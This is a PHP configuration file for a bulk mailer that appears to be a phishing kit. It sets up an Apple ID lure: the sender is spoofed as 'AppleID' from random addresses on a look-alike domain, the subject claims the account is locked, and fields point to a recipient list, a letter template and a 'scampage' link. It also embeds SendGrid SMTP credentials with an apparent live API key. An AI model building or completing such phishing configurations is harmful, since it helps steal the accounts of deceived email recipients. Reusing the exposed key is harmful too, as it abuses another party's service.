<?php

// Format letter:
            ##email## : replace the contents of the letter to show the recipient's email
            ##subject## : Using random subject
            ##frommail## : Using random From mail
            ##fromname## : Using random From name
            ##short## : Using random your URL 
            ##country## : Using random country around the world
            ##date## : Using date time. (NOT RANDOM)
            ##country## : Using random country around the world
            ##date## : Using date time. (NOT RANDOM)
            ##OS## : Using random Operating Systems
            ##browser## : Using random Browsers
//Regards
date_default_timezone_set('Asia/Jakarta');
$date = date('F d, Y, h:i A T');

/* SMTP SETUP */
$smtp_acc = [
    [
        "host"     		=> "smtp.sendgrid.net",
        "port"     		=> "465",
       	"smtp_secure" 	=>  "tls", // or false
        "username"		=> "apikey",
        "password" 		=> "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"
    ],
   
];

/* Features SETUP */

$gx_setup = [
    "priority"       => 1,
    "userandom"      => 0,
    "sleeptime"      => 1,
    "replacement"    => 1,
    "filesend"       => 1,
    "userremoveline" => 0,
    "mail_list"      => "file/maillist/hot.txt",
    "fromname"       => "AppleID",
    "frommail"       => "Notification##randstring##.##randstring##@##randstring##.manage-inbox.online",
    "subject"        => $date . " Your AppleID Has been locked for security reasons",
    "msgfile"        => "file/letter/1.html",
    "filepdf"        => "file/attachment/logo.ico",
    "scampage"       => ["http://google.com"],
];
